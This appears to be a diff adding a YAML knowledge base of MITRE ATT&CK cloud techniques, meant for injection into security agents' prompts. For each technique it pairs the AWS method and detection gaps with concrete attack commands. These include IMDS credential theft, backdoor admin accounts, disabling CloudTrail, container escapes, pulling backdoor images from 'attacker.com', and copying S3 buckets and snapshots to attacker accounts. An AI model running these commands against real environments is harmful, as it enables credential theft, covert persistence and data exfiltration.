@@ -1,0 +1,238 @@
+# Cloud TTP Knowledge Base
+# MITRE ATT&CK technique reference for cloud-specific implementations
+# Used for selective injection into agent prompts based on security findings
+
+techniques:
+  # === CREDENTIAL ACCESS ===
+
+  T1552.005:
+    name: "Unsecured Credentials: Cloud Instance Metadata API"
+    description: "Adversaries may attempt to access cloud instance metadata API to steal credentials and other sensitive data. In AWS, the Instance Metadata Service (IMDS) provides information about an instance, including temporary security credentials if the instance has an IAM role attached."
+    aws_implementation: "IMDSv1 allows unauthenticated access to http://169.254.169.254/latest/meta-data/ from within EC2 instances. Attackers with SSRF or command execution can retrieve IAM credentials from /latest/meta-data/iam/security-credentials/<role-name>. IMDSv2 requires session tokens but is not enabled by default on all instances."
+    commands:
+      - "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
+      - "TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    detection_gap: "IMDSv1 access is not logged by CloudTrail. Application logs may not capture outbound HTTP requests to metadata endpoint. IMDSv2 usage is visible in VPC Flow Logs but requires specific query patterns."
+
+  T1078.004:
+    name: "Valid Accounts: Cloud Accounts"
+    description: "Adversaries may obtain and abuse credentials of a cloud account to gain Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be obtained from breaches, phishing, or credential dumping from on-premises systems."
+    aws_implementation: "Attackers use stolen IAM user access keys or temporary STS credentials to authenticate to AWS APIs. Long-lived access keys stored in code repositories, CI/CD systems, or developer workstations are common targets. Credentials with overly permissive policies enable lateral movement and privilege escalation."
+    commands:
+      - "aws configure --profile compromised"
+      - "aws sts get-caller-identity --profile compromised"
+      - "aws iam list-attached-user-policies --user-name <username>"
+      - "aws iam get-policy-version --policy-arn <arn> --version-id <version>"
+    detection_gap: "CloudTrail logs API calls but may not alert on access from unexpected geographic locations or unusual times. Stolen credentials used within normal business hours from residential IPs may blend with legitimate remote work patterns."
+
+  T1552.001:
+    name: "Unsecured Credentials: Credentials In Files"
+    description: "Adversaries may search compromised systems to find and obtain insecurely stored credentials. Credentials may be stored in configuration files, log files, backup files, or embedded in application code."
+    aws_implementation: "AWS credentials hardcoded in Lambda function code, stored in plaintext in S3 buckets, committed to public or private GitHub repositories, or stored in parameter files for CloudFormation/Terraform deployments. IAM access keys in .aws/credentials files on compromised EC2 instances."
+    commands:
+      - "find / -name credentials -o -name config 2>/dev/null"
+      - "grep -r 'AKIA[0-9A-Z]{16}' /var/www/ 2>/dev/null"
+      - "aws s3 cp s3://<bucket>/config.json - | grep -i key"
+      - "strings /proc/<pid>/environ | grep AWS"
+    detection_gap: "Static credential scanning in repositories may be bypassed if credentials are Base64-encoded or split across files. S3 access logging may not be enabled on all buckets. Lambda function code inspection requires proactive security reviews."
+
+  T1098.001:
+    name: "Account Manipulation: Additional Cloud Credentials"
+    description: "Adversaries may add adversary-controlled credentials to cloud accounts to maintain persistent access. This includes creating new IAM access keys, service account keys, or OAuth tokens."
+    aws_implementation: "Attacker with compromised IAM credentials creates additional access keys for their own user or for other privileged users. CreateAccessKey API call generates long-lived credentials. Attacker may also create new IAM users with console access or modify existing user credentials."
+    commands:
+      - "aws iam create-access-key --user-name <target-user>"
+      - "aws iam create-login-profile --user-name <target-user> --password <password>"
+      - "aws iam update-access-key --user-name <user> --access-key-id <key> --status Active"
+      - "aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+    detection_gap: "CreateAccessKey events are logged in CloudTrail but may not trigger alerts if performed during business hours. High-privilege users creating additional keys may be considered normal administrative activity without contextual analysis."
+
+  # === PRIVILEGE ESCALATION ===
+
+  T1068:
+    name: "Exploitation for Privilege Escalation"
+    description: "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error to execute code under different permissions."
+    aws_implementation: "Exploiting vulnerable container images running in ECS/EKS to escape to the host or gain cluster-admin privileges. Exploiting privilege escalation paths in IAM policies (PassRole + CreateFunction, UpdateFunctionCode, etc.). Abusing IAM policy wildcards to escalate from limited to administrative access."
+    commands:
+      - "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`lambda.amazonaws.com`]].RoleName'"
+      - "aws lambda create-function --function-name escalate --role arn:aws:iam::<account>:role/<privileged-role> --runtime python3.9 --handler lambda_function.lambda_handler --zip-file fileb://payload.zip"
+      - "kubectl auth can-i --list --as=system:serviceaccount:<namespace>:<service-account>"
+    detection_gap: "IAM privilege escalation paths are difficult to detect without proactive policy analysis. CloudTrail logs individual API calls but does not correlate sequences that constitute escalation chains. Container escape attempts may only be visible in container runtime logs if enabled."
+
+  T1134:
+    name: "Access Token Manipulation"
+    description: "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. This can involve duplicating or impersonating tokens."
+    aws_implementation: "Using AssumeRole to impersonate other IAM roles with higher privileges. Modifying EC2 instance IAM role assignments. Exploiting trust relationships between AWS accounts or with external identity providers (SAML, OIDC) to assume roles."
+    commands:
+      - "aws sts assume-role --role-arn arn:aws:iam::<account>:role/<target-role> --role-session-name attacker"
+      - "aws ec2 associate-iam-instance-profile --instance-id <instance> --iam-instance-profile Name=<privileged-profile>"
+      - "aws sts assume-role-with-web-identity --role-arn <arn> --role-session-name attacker --web-identity-token <token>"
+    detection_gap: "AssumeRole calls are logged but may appear legitimate if attacker uses compromised credentials with assume-role permissions. Cross-account AssumeRole may not trigger alerts if trust relationships are misconfigured. Token minting via web identity federation is difficult to distinguish from legitimate application authentication."
+
+  # === PERSISTENCE ===
+
+  T1136.003:
+    name: "Create Account: Cloud Account"
+    description: "Adversaries may create a cloud account to maintain access to victim systems. With sufficient permissions, adversaries can create new IAM users, service accounts, or federated identities."
+    aws_implementation: "Creating new IAM users with console or programmatic access, creating IAM roles with external trust relationships, creating access keys for existing service accounts, or adding new federated identity provider mappings."
+    commands:
+      - "aws iam create-user --user-name backdoor-admin"
+      - "aws iam create-access-key --user-name backdoor-admin"
+      - "aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      - "aws iam create-role --role-name backdoor-role --assume-role-policy-document file://trust-policy.json"
+    detection_gap: "User creation events are logged but may not trigger alerts if performed by privileged administrators. New users created during incident response or onboarding periods may blend in. Dormant backdoor accounts that are never used may evade detection entirely."
+
+  T1525:
+    name: "Implant Internal Image"
+    description: "Adversaries may implant malicious code into container images to establish persistence or facilitate lateral movement. Compromised images may be pushed to internal registries and deployed across the environment."
+    aws_implementation: "Pushing backdoored Docker images to Amazon ECR repositories, modifying Lambda deployment packages to include malicious code, or replacing legitimate AMIs with compromised versions in EC2 Image Builder pipelines."
+    commands:
+      - "docker build -t <account>.dkr.ecr.<region>.amazonaws.com/<repo>:backdoor ."
+      - "aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com"
+      - "docker push <account>.dkr.ecr.<region>.amazonaws.com/<repo>:backdoor"
+      - "aws lambda update-function-code --function-name <function> --image-uri <account>.dkr.ecr.<region>.amazonaws.com/<repo>:backdoor"
+    detection_gap: "ECR image pushes are logged but malicious images are difficult to distinguish from legitimate updates without vulnerability scanning and image signing enforcement. Lambda function code updates may not trigger security reviews if performed by authorized service accounts."
+
+  # === DEFENSE EVASION ===
+
+  T1562.008:
+    name: "Impair Defenses: Disable Cloud Logs"
+    description: "Adversaries may disable cloud logging capabilities to evade detection and operate with reduced visibility. This can include stopping CloudTrail logging, disabling VPC Flow Logs, or deleting log data."
+    aws_implementation: "Calling StopLogging on CloudTrail trails, deleting CloudWatch log groups, modifying S3 bucket policies to prevent log delivery, disabling VPC Flow Logs, or changing IAM policies to prevent log access by security teams."
+    commands:
+      - "aws cloudtrail stop-logging --name <trail-name>"
+      - "aws cloudtrail delete-trail --name <trail-name>"
+      - "aws logs delete-log-group --log-group-name <group>"
+      - "aws ec2 delete-flow-logs --flow-log-ids <id>"
+      - "aws s3api put-bucket-policy --bucket <cloudtrail-bucket> --policy file://deny-logging.json"
+    detection_gap: "Disabling CloudTrail is logged to CloudTrail before it stops, but alerts must be configured and monitoring must be in near-real-time. If primary trail is disabled, backup organizational trails must exist. Log deletion may not be detected if log analysis occurs infrequently."
+
+  T1578:
+    name: "Modify Cloud Compute Infrastructure"
+    description: "Adversaries may modify cloud compute infrastructure to evade defenses or enable further compromise. This includes modifying instance attributes, security groups, network configurations, or resource tags."
+    aws_implementation: "Modifying EC2 security groups to allow inbound access, changing instance metadata options (IMDSv2 to IMDSv1), modifying IAM instance profiles, changing VPC routing tables, or adding ingress rules to network ACLs."
+    commands:
+      - "aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens optional"
+      - "aws ec2 authorize-security-group-ingress --group-id <sg> --protocol tcp --port 22 --cidr 0.0.0.0/0"
+      - "aws ec2 replace-iam-instance-profile-association --association-id <assoc-id> --iam-instance-profile Name=<new-profile>"
+      - "aws ec2 create-route --route-table-id <rtb> --destination-cidr-block 0.0.0.0/0 --gateway-id <igw>"
+    detection_gap: "Individual infrastructure modifications are logged but may not trigger alerts if performed by authorized principals. Incremental changes over time may evade detection. Security group rule additions may be considered legitimate operational changes without contextual analysis."
+
+  # === LATERAL MOVEMENT ===
+
+  T1021.007:
+    name: "Remote Services: Cloud Services"
+    description: "Adversaries may use valid credentials to log into cloud-based remote services to move laterally within an environment. This can include SSM Session Manager, EC2 Instance Connect, or cloud shell access."
+    aws_implementation: "Using AWS Systems Manager Session Manager to access EC2 instances without SSH, EC2 Instance Connect to establish temporary SSH access, or CloudShell to execute AWS CLI commands with IAM user credentials."
+    commands:
+      - "aws ssm start-session --target <instance-id>"
+      - "aws ec2-instance-connect send-ssh-public-key --instance-id <id> --availability-zone <az> --instance-os-user ec2-user --ssh-public-key file://key.pub"
+      - "ssh -i key.pem ec2-user@<instance-ip> -o ProxyCommand='aws ssm start-session --target %h --document-name AWS-StartSSHSession'"
+    detection_gap: "SSM Session Manager connections are logged in CloudTrail but session content is not logged unless Session Manager logging to S3 is explicitly configured. EC2 Instance Connect is logged but may appear as legitimate administrative access. CloudShell sessions are logged but command history is not captured."
+
+  # === DISCOVERY ===
+
+  T1526:
+    name: "Cloud Service Discovery"
+    description: "Adversaries may attempt to enumerate cloud services running on a system after gaining access. This includes discovering AWS services in use, their configurations, and relationships."
+    aws_implementation: "Enumerating AWS services using describe/list API calls to understand the environment. Discovering S3 buckets, RDS databases, Lambda functions, IAM roles, EC2 instances, and other resources to identify targets for further exploitation."
+    commands:
+      - "aws sts get-caller-identity"
+      - "aws iam list-users"
+      - "aws iam list-roles"
+      - "aws s3 ls"
+      - "aws ec2 describe-instances"
+      - "aws rds describe-db-instances"
+      - "aws lambda list-functions"
+      - "aws iam get-account-authorization-details"
+    detection_gap: "Enumeration API calls are logged but are indistinguishable from legitimate administrative queries. Burst patterns of discovery calls may indicate reconnaissance but can also result from automation tools. Slow enumeration over days may evade rate-based detection."
+
+  T1619:
+    name: "Cloud Storage Object Discovery"
+    description: "Adversaries may enumerate objects in cloud storage infrastructure to identify sensitive data for exfiltration or to understand the storage architecture for further exploitation."
+    aws_implementation: "Listing S3 bucket contents to discover sensitive files, enumerating EBS snapshots to find backups containing credentials, or discovering unencrypted RDS snapshots containing production data."
+    commands:
+      - "aws s3 ls s3://<bucket>/ --recursive"
+      - "aws s3api list-objects-v2 --bucket <bucket> --query 'Contents[?Size>`10485760`]'"
+      - "aws ec2 describe-snapshots --owner-ids self"
+      - "aws rds describe-db-snapshots"
+      - "aws ec2 describe-volumes --filters Name=encrypted,Values=false"
+    detection_gap: "S3 access logging must be explicitly enabled and is not on by default. List operations may not trigger alerts as they are common in application workflows. Snapshot enumeration is logged but may not be monitored if security teams focus on data plane rather than control plane activity."
+
+  T1613:
+    name: "Container and Resource Discovery"
+    description: "Adversaries may attempt to discover containers and other cloud resources that are available within a cluster or environment. This includes enumerating Kubernetes resources, ECS tasks, or Lambda functions."
+    aws_implementation: "Listing ECS tasks and services, enumerating EKS cluster resources via kubectl, discovering Lambda functions and their configurations, or identifying container images in ECR repositories."
+    commands:
+      - "aws ecs list-clusters"
+      - "aws ecs list-tasks --cluster <cluster>"
+      - "aws ecs describe-tasks --cluster <cluster> --tasks <task-arns>"
+      - "kubectl get pods --all-namespaces"
+      - "kubectl get secrets --all-namespaces"
+      - "kubectl auth can-i --list"
+      - "aws ecr describe-repositories"
+      - "aws ecr list-images --repository-name <repo>"
+    detection_gap: "Container discovery within EKS requires audit logging to be enabled on the Kubernetes API server. ECS API calls are logged but may not be monitored. Kubectl commands execute within cluster context and may not be visible in CloudTrail unless control plane logging is configured."
+
+  # === EXECUTION ===
+
+  T1609:
+    name: "Container Administration Command"
+    description: "Adversaries may abuse container administration services to execute commands within a container. This can provide access to the container environment and potentially enable container escape or lateral movement."
+    aws_implementation: "Using ECS ExecuteCommand to run commands in running containers, kubectl exec to access pod shells in EKS, or docker exec on compromised container hosts."
+    commands:
+      - "aws ecs execute-command --cluster <cluster> --task <task-arn> --container <container-name> --interactive --command '/bin/bash'"
+      - "kubectl exec -it <pod-name> -n <namespace> -- /bin/bash"
+      - "docker exec -it <container-id> /bin/bash"
+    detection_gap: "ECS ExecuteCommand requires opt-in logging to CloudWatch or S3. Kubectl exec is logged in Kubernetes audit logs only if enabled. Command execution within containers is not visible in CloudTrail. Container runtime logs may not be centralized or monitored."
+
+  T1610:
+    name: "Deploy Container"
+    description: "Adversaries may deploy malicious containers to establish persistence or execute code. This can involve creating new ECS tasks, deploying pods in Kubernetes, or running containers on compromised hosts."
+    aws_implementation: "Creating ECS task definitions with malicious container images, deploying privileged pods in EKS clusters, or running Docker containers with host volume mounts or network access on EC2 instances."
+    commands:
+      - "aws ecs register-task-definition --cli-input-json file://malicious-task.json"
+      - "aws ecs run-task --cluster <cluster> --task-definition <malicious-task>"
+      - "kubectl run backdoor --image=attacker.com/backdoor:latest --restart=Never"
+      - "kubectl apply -f malicious-pod.yaml"
+      - "docker run -d --privileged --net=host -v /:/host attacker/backdoor"
+    detection_gap: "Task definitions and pod deployments are logged but malicious images are difficult to identify without vulnerability scanning and admission control policies. Privileged container flags may not trigger alerts if workloads legitimately require elevated permissions. Host volume mounts are common in infrastructure workloads."
+
+  T1611:
+    name: "Escape to Host"
+    description: "Adversaries may break out of a container to gain access to the underlying host. This may involve exploiting container runtime vulnerabilities, abusing privileged containers, or leveraging misconfigurations."
+    aws_implementation: "Escaping from privileged ECS containers to access EC2 host, breaking out of EKS pods to access worker nodes, or exploiting Docker socket mounts to control the container runtime."
+    commands:
+      - "docker run -v /:/host -it alpine chroot /host"
+      - "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
+      - "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
+      - "kubectl run privileged-pod --image=alpine --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"escape\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'"
+    detection_gap: "Container escape attempts may only be detected by runtime security monitoring tools (Falco, Sysdig). CloudTrail and Kubernetes audit logs do not capture in-container activity. Privileged container deployments may be considered normal for certain workloads without policy enforcement."
+
+  # === EXFILTRATION ===
+
+  T1530:
+    name: "Data from Cloud Storage Object"
+    description: "Adversaries may access data from cloud storage objects to exfiltrate sensitive information. Cloud storage services like AWS S3, Azure Blob Storage, and Google Cloud Storage are commonly used to store large amounts of data, including backups, logs, and application data. Adversaries with appropriate permissions can enumerate and download objects."
+    aws_implementation: "Using stolen IAM credentials or compromised roles to list S3 bucket contents and download objects. Attackers with s3:ListBucket and s3:GetObject permissions can enumerate and exfiltrate data. S3 buckets with overly permissive policies or public access allow unauthenticated data access. Database backups, application logs, and sensitive files stored in S3 are common targets."
+    commands:
+      - "aws s3 ls s3://<bucket-name>/ --recursive"
+      - "aws s3 cp s3://<bucket-name>/<object-key> ./local-file"
+      - "aws s3 sync s3://<bucket-name>/ ./local-directory/"
+      - "aws s3api get-object --bucket <bucket-name> --key <object-key> output-file"
+      - "aws s3api list-objects-v2 --bucket <bucket-name> --query 'Contents[?Size>`10485760`].Key'"
+    detection_gap: "S3 access logging must be explicitly enabled on each bucket and is not on by default. GetObject and ListBucket API calls may not trigger alerts as they are common in application workflows. Large volume downloads may blend with legitimate data export or backup operations. Cross-region or cross-account access may not be monitored without specific CloudTrail event analysis. Presigned URLs allow data access without additional API calls, bypassing CloudTrail logging of the actual download."
+
+  T1537:
+    name: "Transfer Data to Cloud Account"
+    description: "Adversaries may exfiltrate data by transferring it to a cloud account they control. This can involve copying data to attacker-controlled S3 buckets, RDS snapshots, or storage resources in other cloud providers."
+    aws_implementation: "Copying S3 objects to attacker-owned buckets in same or different accounts, creating RDS snapshot copies in attacker accounts, or using cross-account IAM roles to pull data from victim environment."
+    commands:
+      - "aws s3 sync s3://<victim-bucket>/ s3://<attacker-bucket>/"
+      - "aws s3api copy-object --copy-source <victim-bucket>/<key> --bucket <attacker-bucket> --key <key>"
+      - "aws rds create-db-snapshot --db-instance-identifier <victim-db> --db-snapshot-identifier exfil-snapshot"
+      - "aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil-snapshot --attribute-name restore --values-to-add <attacker-account-id>"
+      - "aws ec2 create-snapshot --volume-id <victim-volume> --description 'exfil'"
+      - "aws ec2 modify-snapshot-attribute --snapshot-id <snap> --attribute createVolumePermission --operation-add --user-ids <attacker-account-id>"
+    detection_gap: "Cross-account S3 copy operations may not trigger alerts if bucket policies permit cross-account access. Snapshot sharing requires specific CloudTrail event monitoring. Large data transfers may blend with legitimate backup or migration activities. Exfiltration to external accounts may only be detected through cost anomaly analysis."
